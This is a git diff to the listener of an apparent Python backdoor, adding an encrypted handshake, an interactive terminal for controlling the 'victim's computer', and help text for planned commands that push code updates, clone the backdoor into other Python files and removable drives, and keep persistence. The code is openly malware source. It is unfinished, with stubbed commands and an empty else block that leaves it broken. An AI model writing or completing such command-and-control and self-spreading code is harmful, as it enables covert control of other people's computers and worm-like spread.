@@ -89,25 +89,78 @@ def listen():
             def recive(buffer):
                 return decrypt(conn.recv(buffer).decode("utf-8"))
 
+            def recive_buffer():
+                bff = recive(1024)
+                if bff.startswith("#"):
+                    buffer = int(bff.split("#")[1])
+                    condition_msg = True
+                    while condition_msg:
+                        msg = recive(buffer)
+                        condition_msg = False
+                    return msg
+
             condition = True
 
             while condition:
                 id_msg = recive(1024)
                 condition = False
-
-            print(id_msg)
+            symbols.info("Connection recived")
             if id_msg.startswith("231Py8ackd00r231"):
+                symbols.sucess("Client verified successfully")
                 send("200")
-                condition = True
-                while condition:
-                    bff = recive(1024)
-                    if bff.startswith("#"):
-                        buffer = int(bff.split("#")[1])
-                        condition_msg = True
-                        while condition_msg:
-                            msg = recive(buffer)
-                            condition_msg = False
-                    print(msg)
+                symbols.info("Getting client status...")
+                status = recive(1024)
+                if status == "200":
+                    symbols.sucess("Client status: OK")
+                    # Start the terminal
+                    symbols.info("Starting the terminal...")
+                    condition = True
+                    symbols.sucess("Terminal ready")
+                    path = ">"
+                    while condition:
+                        command = input(path + " ")
+                        if command.startswith("exit"):
+                            symbols.warning("If you exit now without presistence you will loose the connection to the client forever")
+                            exit = input(symbols.info('Do you want to exit? (Yes/No): '))
+                            if exit == "Yes":
+                                symbols.info("Closing connection...")
+                                conn.close()
+                                symbols.info("Connection closed")
+                            elif exit == "No":
+                                pass
+                            else:
+                                symbols.error("Invalid option, aborting command")
+                        #elif command.startswith("background"): ##FUTURE PROJECTS // MULTIPLE SESSIONS
+                        elif command.startswith("help"): ## HELP COMMAND
+                            symbols.info("""
+                                - exit: Exit the connection and closes the backdoor on the victims computer, if precistence isn't active you will loose contact to it forever;
+                                
+                                - codeupdate: Updates the code of the backdoor on the victims computer:
+                                    -p, --path: Path of the source code of the new version of the backdoor;
+                                    
+                                - selfclone: Clone the code to other python files and removable drives on the computer:
+                                    -p, -python: Clone just to python files on the computer,
+                                    -rd, -removable_drives: Clone just to removable drives on the computer,
+                                    -t, --target: Target directory to the search of python files(ex: C:\\Windows\\Users\\%user%\\Desktop\\Python_Files)
+                                
+                                - protect: Protect the 
+                            
+                            """)
+                        #elif command.startswith("codeupdate"):
+                        #elif command.startswith("selfclone"):
+                        #elif command.startswith(""):
+                        #elif command.startswith.(""):
+                        else:
+                            #error/cmd
+
+
+
+                else:
+                    symbols.error("Error getting client status")
+            else:
+                symbols.error("Failed to verify client")
+                symbols.warning("Possible scan to your IP in progress")
+
     except Exception as e:
         print(e)
         pass
